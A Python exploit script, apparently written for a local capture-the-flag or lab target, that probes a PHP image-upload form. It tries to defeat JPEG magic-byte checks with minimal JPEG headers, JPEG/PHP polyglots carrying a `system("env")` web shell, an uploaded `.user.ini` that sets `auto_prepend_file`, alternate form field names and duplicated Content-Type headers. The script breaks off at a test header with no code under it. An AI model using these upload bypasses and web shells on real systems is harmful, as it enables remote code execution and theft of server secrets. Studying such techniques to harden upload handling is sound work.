import requests
import re

base_url = "http://127.0.0.1:33021"

# The validation checks for JPEG magic bytes - but maybe we can bypass with specific techniques

# Test 1: Try uploading with minimal JPEG that passes validation
print("[*] TEST 1: Understand the validation")
# Try various minimal JPEG structures
minimal_jpegs = [
    # Just SOI + EOI
    b'\xff\xd8\xff\xd9',
    # SOI + APP0 + EOI
    b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xff\xd9',
    # SOI + DQT + EOI (minimal valid)
    b'\xff\xd8\xff\xdb\x00C\x00\x08\x06\x06\x07\x06\x05\x08\x07\x07\x07\t\t\x08\x0c\x14\x0d\x0c\x0b\x0b\x0c\x19\x12\x13\x0f\x14\x1d\x1a\x1f\x1e\x1d\x1a\x1c\x1c $.\x28 #\x17\x1c,),.444444)\x22\x22\x22\xff\xd9',
]

for i, jpeg in enumerate(minimal_jpegs):
    files = {'userfile': (f'minimal{i}.jpg', jpeg, 'image/jpeg')}
    r = requests.post(f"{base_url}/index.php", files=files)
    if 'successfully uploaded' in r.text:
        print(f"[+] Minimal JPEG {i} works! Size: {len(jpeg)} bytes")
    else:
        print(f"[-] Minimal JPEG {i} rejected")

# Test 2: Check if the validation is done via getimagesize() or similar
print("\n[*] TEST 2: Check validation method")
# If using exif_imagetype(), only magic bytes matter
magic_only = b'\xff\xd8\xff\xe0TESTDATA\xff\xd9'
files = {'userfile': ('magic.jpg', magic_only, 'image/jpeg')}
r = requests.post(f"{base_url}/index.php", files=files)
print(f"[+] Magic-only upload: {'success' if 'uploaded' in r.text else 'failed'}")

# Test 3: Try to upload .user.ini by appending .jpg extension
print("\n[*] TEST 3: Upload .user.ini.jpg")
userini_content = b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xff\xd9'
userini_content += b'\nauto_prepend_file=shell.jpg\n'
files = {'userfile': ('.user.ini.jpg', userini_content, 'image/jpeg')}
r = requests.post(f"{base_url}/index.php", files=files)
print(f"[+] Response: {r.text[:500]}")

# Check if .user.ini was created (without .jpg suffix)
r2 = requests.get(f"{base_url}/upload/.user.ini")
if r2.status_code == 200:
    print("[!!!] .user.ini EXISTS!")
    print(f"[+] Content: {r2.text}")

# Test 4: Try uploading via different field name
print("\n[*] TEST 4: Different field names")
field_names = ['file', 'image', 'upload', 'userfile[]']
for field in field_names:
    jpeg = b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xff\xd9<?php system("env"); ?>'
    files = {field: ('test.jpg', jpeg, 'image/jpeg')}
    r = requests.post(f"{base_url}/index.php", files=files)
    if 'uploaded' in r.text:
        print(f"[+] Field '{field}' works")

# Test 5: Try to bypass with double Content-Type
print("\n[*] TEST 5: Content-Type bypass")
# Custom multipart request with multiple Content-Types
import io
boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW'
body = io.BytesIO()
body.write(f'------WebKitFormBoundary7MA4YWxkTrZu0gW\r\n'.encode())
body.write(b'Content-Disposition: form-data; name="userfile"; filename="shell.jpg"\r\n')
body.write(b'Content-Type: image/jpeg\r\n')
body.write(b'Content-Type: application/x-httpd-php\r\n\r\n')
body.write(b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00<?php system("env"); ?>\xff\xd9\r\n')
body.write(b'------WebKitFormBoundary7MA4YWxkTrZu0gW--\r\n')
headers = {'Content-Type': f'multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW'}
r = requests.post(f"{base_url}/index.php", data=body.getvalue(), headers=headers)
print(f"[+] Response: {r.text[:500]}")

# Test 6: Check if there's parameter pollution
print("\n[*] TEST 6: Parameter pollution")
